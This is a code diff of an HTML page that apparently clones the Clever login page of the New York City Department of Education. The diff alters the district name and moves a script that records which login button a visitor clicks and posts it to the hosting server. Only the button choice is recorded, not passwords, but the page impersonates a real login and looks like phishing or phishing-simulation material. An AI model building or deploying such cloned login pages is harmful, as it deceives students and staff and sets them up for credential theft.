@@ -21,7 +21,7 @@
           <div class="flexbox items--center DistrictHeader--title">
             <img class="DistrictHeader--districtLogo" src="https://clever-district-logos.s3.amazonaws.com/54d263946cc968010000007a/color-1691516277677.png" alt="District logo">
             <div class="flexbox flex--direction--column">
-              <h1 class="DistrictHeader--districtName">baka</h1>
+              <h1 class="DistrictHeader--districtName">uuuauuu</h1>
               <a aria-label="Not your district?" class="Button Button--linkPlain Button--regular DistrictHeader--districtLink Button--linkUnderlined" href="https://clever.com/oauth/district-picker?response_type=code&amp;redirect_uri=https%3A%2F%2Faccounts.naviance.com%2Flogin%2Fcallback&amp;scope=openid%20read%3Adistrict_admins_basic%20read%3Aschool_admins_basic%20read%3Astudents_basic%20read%3Ateachers_basic%20read%3Auser_id&amp;state=CMGa7vEjgqNOLJH2ela8o39qa1ionjFA&amp;client_id=998d799b68dd5e1b6a57&amp;district_id=54d263946cc968010000007a" target="_self">Not your district?</a>
             </div>
           </div>
@@ -37,26 +37,6 @@
 </form>
 
 <!-- NYCENET Login -->
-
-<script>
- document.querySelectorAll('.trackable').forEach(btn => {
-  btn.addEventListener('click', e => {
-    e.preventDefault(); // ⬅️ stops “page not found”
-    const choice = btn.dataset.choice;
-    document.querySelector('#button-choice').value = choice;
-  fetch("/", {
-  method: "POST",
-  headers: { "Content-Type": "application/x-www-form-urlencoded" },
-  body: new URLSearchParams(new FormData(document.querySelector('form[name="clever-tracker"]'))).toString()
-})
-    .then(() => {
-  alert(`Submitted: ${choice}`);
-  // or redirect if needed:
-  // window.location.href = '/thank-you.html';
-})
-  });
-});
-</script>
               
               <button class="flexbox items--center AuthMethod--container trackable" type="button" data-choice="nycenet" aria-label="Log in with NYCENET - Recommended for Students and Teachers">
                 <img class="AuthMethod--icon" src="data:image/svg+xml;base64,77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtMy4yMjE3IDE1LjI3Ny0wLjIyMTY3LTkuNzA1OGMwLTIuNTk3NCAwLjkxMDczLTIuNzQ3OSAzLjM3NTQtMi43NDc5bDUuOTQ5Ny0xLjk2NjRjMS45NTA4IDEuMzEwOSA5LjEwMzUgMS4zMzU0IDkuMTAzNSAzLjkzMjh2MTAuNDg3YzAgMi41OTc0LTYuNTAyNSA2LjU1NDctOS4xMDM1IDcuODY1NmwtMy4yNTEyLTEuOTY2NGMtMi42NDUzLTEuODkwOC01LjY0NTMtNC40NjIyLTUuODUyMi01Ljg5OTJ6IiBmaWxsPSIjNjg2Rjg4Ii8+PHBhdGggZD0ibTEyLjQyNSAwIDAuMzg0MyAwLjIyNzkxYzIuODY0MiAxLjY5ODUgNS41MTA3IDIuMzQwOSA4Ljc5NTkgMi42Mjk2bDAuNjgxOCAwLjA1OTkxdjkuMDI4YzAgMy40NzE1LTEuMjM2OSA1LjY2MDUtMy4wODg1IDcuMzcwNi0wLjkwNDQgMC44MzUxLTEuOTQ2NiAxLjU0ODktMy4wMjEyIDIuMjM5Ni0wLjMyMjUgMC4yMDczLTAuNjQ2NSAwLjQxMTctMC45NzE5IDAuNjE2OS0wLjc3NTIgMC40ODg5LTEuNTU4NSAwLjk4My0yLjM1MDIgMS41MzQ2bC0wLjQyMDQgMC4yOTI5LTAuNDIzNy0wLjI4ODNjLTAuNzQ0Ny0wLjUwNjgtMS40Nzc3LTAuOTY0MS0yLjIwNS0xLjQxNzktMC4zNzU0MS0wLjIzNDItMC43NDkyOC0wLjQ2NzUtMS4xMjI0LTAuNzA2MS0xLjA3NjYtMC42ODg0LTIuMTE5Mi0xLjQwNDktMy4wMjQyLTIuMjQ1NS0xLjg1MTEtMS43MTk2LTMuMDg2OS0zLjkyNjYtMy4wODY5LTcuMzk2OHYtOS4wMjhsMC42ODE3MS0wLjA1OTkxYzMuMjkxLTAuMjg5MTkgNi4wMDY0LTAuOTMyOTQgOC43ODg4LTIuNjI1M2wwLjM4MTgtMC4yMzIyem0wLjAwOTEgMS43NDMxYy0yLjcwNTkgMS41NjMxLTUuMzY1MSAyLjIyNjYtOC4zNjc5IDIuNTQ0djcuNjU4M2MwIDMuMDI0OSAxLjA0MTggNC44NDAzIDIuNjA3MSA2LjI5NDQgMC44MDMyNiAwLjc0NjIgMS43NTM1IDEuNDA0NCAyLjgxMjIgMi4wODE0IDAuMzQ0NjMgMC4yMjA0IDAuNzA0MjUgMC40NDQ4IDEuMDcyOCAwLjY3NDkgMC42MDY3IDAuMzc4NiAxLjIzNzcgMC43NzI1IDEuODY2OCAxLjE4ODcgMC42ODIzLTAuNDYxMyAxLjM2NDQtMC44OTE2IDIuMDE2OS0xLjMwMzIgMC4zMTg1LTAuMjAwOCAwLjYyOTgtMC4zOTcyIDAuOTMwNy0wLjU5MDYgMS4wNjA3LTAuNjgxNyAyLjAxMTQtMS4zMzc5IDIuODE1Mi0yLjA4MDMgMS41NjQ4LTEuNDQ1MiAyLjYwNTUtMy4yNDE3IDIuNjA1NS02LjI2NTN2LTcuNjU4NGMtMy4wMDA5LTAuMzE4MTQtNS42MDE0LTAuOTgzMDctOC4zNTkzLTIuNTQzOHoiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0iIzY4NkY4OCIgZmlsbC1ydWxlPSJldmVub2RkIi8+PHBhdGggZD0ibTEwLjk5MiA5LjQ1MDRjMCAwLjA3MzA3IDFlLTQgMC4xNDgyIDFlLTQgMi4yMjU2bC0xLjQ5MzQtMWUtNGMwIDIuOTI3OS0xLjFlLTQgLTIuMTQ0LTIuMmUtNCAtMi4yMTU2LTYuMmUtNCAtMC40MjE3OC0wLjAwMTIyLTAuODMwMyAwLjAyMDE5LTEuMTkzIDAuMDI0OTItMC40MjIwNyAwLjA4MjIzLTAuODU2OTQgMC4yNDI0Ny0xLjI0NDUgMC4xNzA5Ni0wLjQxMzQ2IDAuNDU1ODktMC43NjQ2NyAwLjg5NTk5LTAuOTk1MDEgMC40MTU0LTAuMjE3NDIgMC45MTEtMC4yOTY0OSAxLjQ2MDMtMC4yOTY0OSAwLjUxNDMgMCAwLjk4MzMgMC4wODE3NyAxLjM3NzUgMC4zMDMwMiAwLjQxNDUgMC4yMzI2MyAwLjY3NDYgMC41Nzg5MyAwLjgyODQgMC45Njg2OSAwLjE0NDkgMC4zNjc0IDAuMTk2IDAuNzc0MjQgMC4yMTc5IDEuMTYxMiAwLjAxODMgMC4zMjU1IDAuMDE3NiAwLjY4NzUgMC4wMTY5IDEuMDUyMS0xZS00IDAuMDcwMjUtMmUtNCAyLjE0MDYtMmUtNCAxLjIxMDhoLTEuNDkzNWMwLTAuMDc3OCAxZS00IC0xLjE1MzEgMmUtNCAtMS4yMjYyIDZlLTQgLTAuMzY1MTQgMC4wMDEyLTAuNjc0NTItMC4wMTQ1LTAuOTUyNS0wLjAxODktMC4zMzQ4OS0wLjA1OTEtMC41NTI3MS0wLjExNjEtMC42OTczOC0wLjA0ODMtMC4xMjIzMi0wLjEwMDktMC4xNzU1LTAuMTcwMS0wLjIxNDM0LTAuMDg5NC0wLjA1MDIyLTAuMjc1LTAuMTExOS0wLjY0NjUtMC4xMTE5LTAuNDI0NCAwLTAuNjQ5NiAwLjA2NDM5LTAuNzY3NyAwLjEyNjIxLTAuMDkzNSAwLjA0ODkxLTAuMTU0OCAwLjExMjc1LTAuMjA4NCAwLjI0MjQ3LTAuMDY0NCAwLjE1NTY0LTAuMTEgMC4zOTIxLTAuMTMxOCAwLjc2MTg1LTAuMDE4NSAwLjMxMzcyLTAuMDE4MSAwLjY2OTU1LTAuMDE3NSAxLjA5NTF6IiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGZpbGw9IiNFOEVBRjAiIGZpbGwtcnVsZT0iZXZlbm9kZCIvPjxwYXRoIGQ9Im03LjcxNDggMTIuMTY5YzAtMS4yMzcyIDEuMDAzLTIuMjQwMiAyLjI0MDItMi4yNDAyaDQuMzIyOGMxLjIzNzMgMCAyLjI0MDMgMS4wMDMgMi4yNDAzIDIuMjQwMnYyLjUzOTljMCAxLjIzNzMtMS4wMDMgMi4yNDAyLTIuMjQwMyAyLjI0MDJoLTQuMzIyOGMtMS4yMzcyIDAtMi4yNDAyLTEuMDAyOS0yLjI0MDItMi4yNDAydi0yLjUzOTl6IiBmaWxsPSIjRThFQUYwIi8+PC9zdmc+DQo=" alt="">
@@ -133,5 +113,25 @@ document.querySelectorAll('.AuthMethod--container').forEach(link => {
     <script type="text/javascript" nonce="287923b72695c31d906d">window.__staticMountPoint = JSON.parse(decodeURIComponent("%22https%3A%2F%2Fassets.clever.com%2Foauth%2F38783b42bc67f8db7a32c0f7a0c1f2fa3a6bab89%22"))</script>
     <script type="text/javascript" nonce="287923b72695c31d906d">window.__initalReactProps = JSON.parse(decodeURIComponent("%7B%22nonce%22%3A%22287923b72695c31d906d%22%2C%22static_mount_point%22%3A%22https%3A%2F%2Fassets.clever.com%2Foauth%2F38783b42bc67f8db7a32c0f7a0c1f2fa3a6bab89%22%2C%22kioskLogin%22%3Afalse%2C%22chromebookLogin%22%3Afalse%2C%22target%22%3A%22NTRkMjYzOTQ2Y2M5NjgwMTAwMDAwMDdh%3BOTk4ZDc5OWI2OGRkNWUxYjZhNTc%3D%3BaHR0cHM6Ly9hY2NvdW50cy5uYXZpYW5jZS5jb20vbG9naW4vY2FsbGJhY2s%3D%3BQ01HYTd2RWpncU5PTEpIMmVsYThvMzlxYTFpb25qRkE%3D%3BY29kZQ%3D%3D%3B%22%2C%22authMethods%22%3A%5B%7B%22name%22%3A%22SAML%22%2C%22slug%22%3A%22saml%22%2C%22label%22%3A%22Log%20in%20with%20NYCENET%20-%20Recommended%20for%20Students%20and%20Teachers%22%2C%22provider%22%3A%22%22%2C%22usernameHint%22%3A%22%22%2C%22passwordHint%22%3A%22%22%7D%2C%7B%22name%22%3A%22Clever%22%2C%22slug%22%3A%22sis%22%2C%22label%22%3A%22Students%2C%20Teachers%2C%20and%20School%20Staff%22%2C%22provider%22%3A%22%22%2C%22usernameHint%22%3A%22Students%3A%20Student%20OSIS%20Number%20(example%3A%20123456789)%5Cn%5CnTeachers%3A%20Employee%20Reference%20ID%20Number%20(example%3A%201234567)%20*not%20your%20file%20number*%20%5Cn%5CnSPOCs%20and%20School%20Admins%3A%20Email%20Address%20(%40schools.nyc.gov)%22%2C%22passwordHint%22%3A%22Students%3A%20Student%20OSIS%20Number%20(and%20then%20reset%20your%20password)%5Cn%5CnTeachers%3A%20Employee%20Reference%20ID%20Number%20(and%20then%20reset%20your%20password)%5Cn%5CnSPOCs%20and%20School%20Admins%3A%20Employee%20Reference%20ID%20Number%22%7D%2C%7B%22name%22%3A%22Clever%20Badges%22%2C%22slug%22%3A%22badges%22%2C%22label%22%3A%22%22%2C%22provider%22%3A%22%22%2C%22usernameHint%22%3A%22%22%2C%22passwordHint%22%3A%22%22%7D%5D%2C%22districtName%22%3A%22New%20York%20City%20Dept%20Of%20Education%22%2C%22districtPickerURL%22%3A%22%2Foauth%2Fdistrict-picker%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.naviance.com%252Flogin%252Fcallback%26scope%3Dopenid%2520read%253Adistrict_admins_basic%2520read%253Aschool_admins_basic%2520read%253Astudents_basic%2520read%253Ateachers_basic%2520read%253Auser_id%26state%3DCMGa7vEjgqNOLJH2ela8o39qa1ionjFA%26client_id%3D998d799b68dd5e1b6a57%26district_id%3D54d263946cc968010000007a%22%2C%22districtAdminLoginURL%22%3A%22%22%2C%22districtLogo%22%3A%22https%3A%2F%2Fclever-district-logos.s3.amazonaws.com%2F54d263946cc968010000007a%2Fcolor-1691516277677.png%22%2C%22techSupportContact%22%3A%22your%20school's%20Technology%20Specialist%22%2C%22errors%22%3A%5B%5D%7D"))</script><script type="text/javascript" src="https://assets.clever.com/oauth/38783b42bc67f8db7a32c0f7a0c1f2fa3a6bab89/vendor.js"></script>
     <script type="text/javascript" src="https://assets.clever.com/oauth/38783b42bc67f8db7a32c0f7a0c1f2fa3a6bab89/Login.js"></script>
+
+    <script>
+ document.querySelectorAll('.trackable').forEach(btn => {
+  btn.addEventListener('click', e => {
+    e.preventDefault(); // ⬅️ stops “page not found”
+    const choice = btn.dataset.choice;
+    document.querySelector('#button-choice').value = choice;
+  fetch("/", {
+  method: "POST",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  body: new URLSearchParams(new FormData(document.querySelector('form[name="clever-tracker"]'))).toString()
+})
+    .then(() => {
+  alert(`Submitted: ${choice}`);
+  // or redirect if needed:
+  // window.location.href = '/thank-you.html';
+})
+  });
+});
+</script>
   </body>
 </html>
